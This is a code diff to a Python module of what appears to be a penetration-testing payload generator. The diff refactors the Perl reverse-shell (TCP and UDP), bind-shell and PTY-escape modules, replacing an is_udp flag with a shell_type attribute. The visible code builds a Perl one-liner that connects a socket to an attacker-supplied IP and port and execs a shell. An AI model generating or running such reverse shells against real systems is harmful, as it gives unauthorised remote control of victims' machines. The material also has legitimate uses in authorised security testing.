@@ -13,10 +13,11 @@ class ReverseTCP(plugin.ReverseShell):
 
         self.opts.description = "[ReverseShell][TCP] Perl from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
+        self.shell_type = "tcp"
 
     def make_shell(self):
         self.shell = f"""perl -e 'use Socket;$i="{self.args.ip}";$p={self.args.port};"""
-        if self.is_udp:
+        if self.shell_type == "udp":
             self.shell += """socket(S,PF_INET,SOCK_DGRAM,getprotobyname("udp"));if(connect(S,"""
         else:
             self.shell += """socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,"""
@@ -25,7 +26,7 @@ class ReverseTCP(plugin.ReverseShell):
         self.shell += """};'"""
 
 
-class TTY(plugin.Module):
+class PTY(plugin.Module):
     def __init__(self):
         super().__init__()
         self.add_args(
@@ -34,8 +35,9 @@ class TTY(plugin.Module):
             choices=const.LINUX_SHELL,
             help="Select shell type on target machine"
         )
-        self.opts.description = "[TTYShell] Perl TTY shell escape from https://netsec.ws/?p=337"
+        self.opts.description = "[PTYShell] Perl PTY shell escape from https://netsec.ws/?p=337"
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
+        self.shell_type = "pty"
 
     def make_shell(self):
         self.shell = """perl -e 'exec "{self.args.shell}"'"""
@@ -44,7 +46,7 @@ class TTY(plugin.Module):
 class ReverseUDP(ReverseTCP):
     def __init__(self):
         super().__init__()
-        self.is_udp = True
+        self.shell_type = "udp"
         self.opts.description = "[ReverseShell][UDP] Perl from swisskyrepo/PayloadsAllTheThings. License MIT."
 
 
@@ -57,7 +59,7 @@ class BindTCP(plugin.BindShell):
             choices=const.LINUX_SHELL,
             help="Select shell type on target machine"
         )
-
+        self.shell_type = "tcp"
         self.opts.description = "[BindShell][TCP] Perl from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
 
@@ -72,7 +74,7 @@ class BindUDP(BindTCP):
     def __init__(self):
         super().__init__()
         self.opts.description = "[BindShell][UDP] Perl from swisskyrepo/PayloadsAllTheThings. License MIT."
-        self.is_udp = True
+        self.shell_type = "udp"
 
     def make_shell(self):
         pass # TODO make bind shell UDP for Perl
